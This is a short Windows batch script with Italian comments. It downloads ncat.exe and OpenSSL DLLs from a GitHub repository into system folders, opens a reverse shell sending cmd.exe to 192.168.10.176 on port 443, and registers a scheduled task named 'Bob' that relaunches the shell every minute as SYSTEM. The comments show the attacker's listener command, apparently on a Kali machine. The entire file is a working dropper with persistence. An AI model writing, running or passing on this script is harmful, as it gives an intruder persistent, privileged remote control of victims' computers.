@echo off
curl -L -o "C:\Windows\Temp\ncat.exe" "https://github.com/Ax0my10rk/A/raw/refs/heads/main/ncat.exe"
curl -L -o "C:\Windows\SysWOW64\libcrypto-3.dll" "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libcrypto-3.dll"
curl -L -o "C:\Windows\SysWOW64\libssl-3.dll" "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libssl-3.dll"
timeout /t 1 >nul
start "" /B "C:\Windows\Temp\ncat.exe" 192.168.10.176 443 -e cmd.exe
schtasks /create /tn "Bob" /tr "\"C:\Windows\Temp\ncat.exe\" 192.168.10.176 443 -e cmd.exe" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f

:: chiamante
:: ncat.exe L.IP.DI.KALI 443 -e cmd.exe
:: ricevente
:: nc -nvlp 443
